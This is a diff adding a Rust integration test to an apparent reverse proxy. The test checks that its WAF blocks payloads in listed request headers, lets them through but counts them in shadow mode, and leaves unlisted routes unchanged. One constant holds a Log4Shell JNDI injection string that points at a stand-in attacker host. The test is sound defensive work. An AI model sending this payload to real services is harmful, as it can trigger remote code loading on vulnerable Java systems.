@@ -4262,3 +4262,66 @@ async fn the_number_of_cached_entries_is_on_metrics() {
         tokio::time::sleep(Duration::from_millis(20)).await;
     }
 }
+
+// ── WAF: request header values (#519) ───────────────────────────────────────
+
+/// Through the pipeline: a payload in a scanned header is refused, shadow mode counts it and
+/// lets it through, and a route whose profile lists no header behaves as before.
+#[tokio::test]
+async fn the_waf_scans_the_headers_a_profile_lists() {
+    let (port, hits) = named_origin("A").await;
+    let st = hosts_state(
+        "[[route]]\npath = \"/scan/{*r}\"\nupstream = \"a\"\nwaf_profile = \"h\"\n\
+         [[route]]\npath = \"/shadow/{*r}\"\nupstream = \"a\"\nwaf_profile = \"h\"\nwaf_shadow = true\n\
+         [[route]]\npath = \"/plain/{*r}\"\nupstream = \"a\"\nwaf = true\n",
+        &format!(
+            "a = \"http://127.0.0.1:{port}\"\n[waf_profile.h]\nscan_headers = [\"user-agent\", \"x-*\"]"
+        ),
+    );
+    let send = |path: &'static str, ua: &'static str| {
+        let st = st.clone();
+        async move {
+            let req = Request::builder()
+                .method(Method::GET)
+                .uri(path)
+                .header("user-agent", ua)
+                .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
+                .unwrap();
+            let resp = process_request(req, st, "203.0.113.9:1".parse().unwrap(), false)
+                .await
+                .unwrap();
+            resp.status().as_u16()
+        }
+    };
+    const LOG4SHELL: &str = "${jndi:ldap://evil.example/a}";
+    const BROWSER: &str = "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0";
+    let would_block = || {
+        crate::metrics::METRICS
+            .waf_shadow_would_block
+            .load(Ordering::Relaxed)
+    };
+    assert_eq!(send("/scan/x", BROWSER).await, 200);
+    let before = hits.load(Ordering::Relaxed);
+    assert_eq!(
+        send("/scan/x", LOG4SHELL).await,
+        400,
+        "refused before the upstream"
+    );
+    assert_eq!(
+        hits.load(Ordering::Relaxed),
+        before,
+        "the origin never saw it"
+    );
+    let counted = would_block();
+    assert_eq!(
+        send("/shadow/x", LOG4SHELL).await,
+        200,
+        "shadow mode lets it through"
+    );
+    assert!(would_block() > counted, "and counts it");
+    assert_eq!(
+        send("/plain/x", LOG4SHELL).await,
+        200,
+        "a WAF route that lists no header does not scan headers (unchanged default)"
+    );
+}
